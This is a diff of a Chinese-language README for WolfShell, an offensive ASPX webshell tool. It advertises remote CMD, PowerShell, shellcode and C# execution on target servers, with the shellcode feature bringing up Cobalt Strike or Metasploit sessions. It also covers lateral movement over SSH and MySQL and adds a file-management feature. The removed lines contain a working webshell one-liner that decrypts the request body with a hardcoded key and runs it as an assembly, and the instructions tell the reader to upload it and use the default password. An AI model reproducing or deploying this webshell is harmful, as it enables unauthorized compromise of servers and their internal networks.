@@ -24,6 +24,7 @@
 ## 🔥 功能特性
 
 *   Cmd命令执行： 在目标系统上直接执行任意 CMD 命令。
+*   文件管理： 在目标系统上枚举目录文件、新建文件、重命令、删除、设置文件时间等。
 *   PowerShell命令执行： 支持执行 PowerShell 脚本和命令。
 *   Shellcode执行： 可在目标环境内直接执行原生的 Shellcode，一键上线Cobalt Strike、Metasploit。
 *   C#代码执行： 支持在运行时动态加载与执行 C# 代码。
@@ -36,7 +37,7 @@
 *   内网级联PowerShell执行： 支持在复杂的内网环境中，级联内网webshell执行 PowerShell 命令进行横向移动。
 *   sshcmd：SSH 远程命令执行工具，支持通过 webshell 建立 SSH 链接，实现对内网主机的命令执行与横向移动。
 *   mysqlcmd：MySQL 数据库连接工具，支持通过 webshell 连接内网MySQL，执行查询、导入导出等数据库操作。
-  
+
 ## 辅助功能
 
 ### 加密解密
@@ -55,16 +56,10 @@
 3. **上传WolfShell**
    - 将WolfShell文件上传到目标ASPX服务器。
 
-```csharp
-
-<%@ Page Language="C#" %><%if (Request.Cookies.Count != 0) { byte[] k = Encoding.Default.GetBytes("ca63457538b9b1e0"); System.IO.Stream s = Request.InputStream; byte[] c = new byte[s.Length]; s.Read(c, 0, c.Length); System.Reflection.Assembly.Load(new System.Security.Cryptography.RijndaelManaged().CreateDecryptor(k, k).TransformFinalBlock(c, 0, c.Length)).CreateInstance("K").Equals(this); }%>
-
-```
-
 4. **访问WebShell**
    - 通过工具客户端连接WebShell，默认密码 WolfShell，修改密码可使用工具上的WolfHash加密。
 
-![wolf](http://www.18k.icu/img/wolfshell/WolfShell.png)
+![wolfshell](http://www.18k.icu/img/wolfshell/WolfShell.png)
 
 
 ## 示例
@@ -76,6 +71,12 @@
 ### PowerShell命令执行
 
 ![PowerShell示例](http://www.18k.icu/img/wolfshell/PowerShell.png)
+
+
+### 文件管理
+
+![FileMgr](http://www.18k.icu/img/wolfshell/FileMgr.png)
+
 
 ### C#代码执行
 
